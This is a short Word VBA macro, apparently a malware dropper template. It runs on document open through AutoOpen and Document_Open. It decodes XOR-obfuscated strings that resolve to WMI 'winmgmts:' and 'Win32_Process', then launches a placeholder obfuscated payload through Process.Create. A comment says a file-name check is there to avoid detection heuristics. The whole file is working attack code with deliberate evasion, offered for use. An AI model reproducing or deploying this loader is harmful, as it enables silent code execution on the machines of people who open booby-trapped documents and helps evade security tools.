Function Pears(beets)
  Pears = Chr(beets Xor Asc("a"))
End Function

Function Strawberries(grapes)
  Strawberries = Left(grapes, 3)
End Function

Function Almonds(jelly)
  Almonds = Right(jelly, Len(jelly) - 3)
End Function

Function Nuts(milk)
  Do
    Oatmilk = Oatmilk + Pears(Strawberries(milk))
    milk = Almonds(milk)
  Loop While Len(milk) > 0
  Nuts = Oatmilk
End Function

Function Macro()
  ' avoid heuristics based on  file name
  If ActiveDocument.Name <> Nuts("<insert document name>") Then
    Exit Function
  End If

  Dim Apples As String
  Dim Water As String
  Apples = "<insert obfuscated payload>"
  Water = Nuts(Apples)
  GetObject(Nuts("022008015012006012021018091")).Get(Nuts("054008015082083062049019014002004018018")).Create Water, Tea, Coffee, Napkin
End Function

Sub Document_Open()
  Macro
End Sub

Sub AutoOpen()
  Macro
End Sub